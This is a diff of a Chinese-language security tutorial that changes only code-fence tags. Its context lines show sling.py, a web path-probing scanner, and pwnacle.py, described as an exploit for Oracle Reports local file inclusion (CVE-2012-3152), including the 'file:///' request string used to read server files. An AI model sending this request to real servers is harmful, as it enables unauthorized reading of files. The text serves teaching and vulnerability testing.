@@ -13,7 +13,7 @@
 
 下面的这个脚本使用"-i"参数把文件的 url 连接传递到脚本里面，然后使用"-r"参数指定请求的路径,最好使用"-s"参数去指定检测是否含有 CLI 漏洞的字符串.
 
-```
+```py
 $ python sling.py -h
 Usage: sling.py -i <file_with URLs> -r  -s [optional]
 
@@ -26,7 +26,7 @@ Options:
 
 存储 url 链接列表文件的文本格式应该是这样的——"[`www.google.com`](http://www.google.com)" 一行，并且文件请求的路径应该是"request/"每行,例如:
 
-```
+```py
 reqs:
 CFIDE/
 admin/
@@ -35,7 +35,7 @@ tmp/
 
 下面是一个脚本调用的例子但是没有指定检测字符串:
 
-```
+```py
 $ python sling.py -i URLs -r reqs
 [+] URL: http://www.google.com/CFIDE/ [404]
 [+] URL: http://www.google.com/admin/ [404]
@@ -48,7 +48,7 @@ $ python sling.py -i URLs -r reqs
 
 现在当创建这些请求的时候，你可能想定义一个检测语句以减少误报，例如：你现在请求的路径是"/CFIDE/administrator/enter.cfm",你可以指定检测"CFIDE"的".cfm"页面是否有问题,这样就帮助你减少很多不必要耗费的时间.下面这个例子演示了上面脚本的完整示例:
 
-```
+```py
 $ python sling.py -i URLs -r reqs -s google
 [+] URL: http://www.google.com/CFIDE/ [404] Found: 'google' in ouput
 [+] URL: http://www.google.com/admin/ [404] Found: 'google' in ouput
@@ -61,19 +61,19 @@ $ python sling.py -i URLs -r reqs -s google
 
 在几个月以前,一个安全研究员[NI@root](http://blog.netinfiltration.com/2013/12/12/hacking-oracle-reports-11g/)　发表过一篇详细的 Oracle 本地包含漏洞的报告,在报告发布的同时还发布了一个 POC 检测工具,用来检测你的服务器是否有 bug,除此以外就没有任何工具了,该漏洞允许你通过发起以下请求连接来访问服务器的其他文件或目录,使用"file:///".
 
-```
+```py
 request = '/reports/rwservlet?report=test.rdf+desformat=html+destype=cache+JOBTYPE=rwurl+URLPARAMETER="file:///' 
 ```
 
 下面是调用这个脚本的语法:
 
-```
+```py
 $ python pwnacle.py <server> <resource> 
 ```
 
 pwnacle.py:
 
-```
+```py
 #######################################
 # pwnacle.py - Exploits CVE-2012-3152 #
 # Oracle Local File Inclusion (LFI)   #
@@ -119,7 +119,7 @@ if 'https://' in server:  # Create web request with ssl module
 
 Sling.py:
 
-```
+```py
 #####################################
 # sling.py - checks for resources   #
 # Can seach for string in response  #
